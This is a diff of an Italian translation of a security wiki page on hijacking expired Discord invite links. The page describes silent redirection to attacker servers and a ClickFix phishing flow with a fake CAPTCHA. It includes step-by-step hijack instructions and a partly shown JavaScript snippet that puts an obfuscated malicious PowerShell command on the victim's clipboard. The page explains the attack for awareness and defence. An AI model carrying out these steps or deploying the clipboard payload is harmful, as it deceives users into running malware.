@@ -21,10 +21,10 @@ La vulnerabilità del sistema di inviti di Discord consente agli attori delle mi
 - Creare o utilizzare un server Discord esistente con privilegi di Potenziamento di Livello 3.
 - In **Impostazioni Server → URL Vanity**, tentare di assegnare il codice di invito target. Se accettato, il codice è riservato dal server malevolo.
 3. Attivazione del Dirottamento
-- Per inviti temporanei, attendere fino a quando l'invito originale scade (o eliminarlo manualmente se controlli la sorgente).
+- Per inviti temporanei, attendere che l'invito originale scada (o eliminarlo manualmente se controlli la sorgente).
 - Per codici contenenti lettere maiuscole, la variante minuscola può essere rivendicata immediatamente, anche se il reindirizzamento si attiva solo dopo la scadenza.
 4. Reindirizzamento Silenzioso
-- Gli utenti che visitano il vecchio link vengono inviati senza problemi al server controllato dall'attaccante una volta che il dirottamento è attivo.
+- Gli utenti che visitano il vecchio link vengono inviati senza soluzione di continuità al server controllato dall'attaccante una volta che il dirottamento è attivo.
 
 ## Flusso di Phishing tramite Server Discord
 
@@ -35,7 +35,7 @@ La vulnerabilità del sistema di inviti di Discord consente agli attori delle mi
 - Visualizzare un messaggio CAPTCHA rotto.
 - Guidare gli utenti ad aprire la finestra di dialogo **Win+R**, incollare un comando PowerShell precaricato e premere Invio.
 
-### Esempio di Iniezione negli Appunti ClickFix
+### Esempio di Iniezione Clipboard ClickFix
 ```javascript
 // Copy malicious PowerShell command to clipboard
 const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
@@ -55,7 +55,7 @@ Questo approccio evita download diretti di file e sfrutta elementi UI familiari 
 
 ## Riferimenti
 
-- From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/
-- Discord Custom Invite Link Documentation – https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link
+- From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – [https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
+- Discord Custom Invite Link Documentation – [https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
 
 {{#include ../../banners/hacktricks-training.md}}
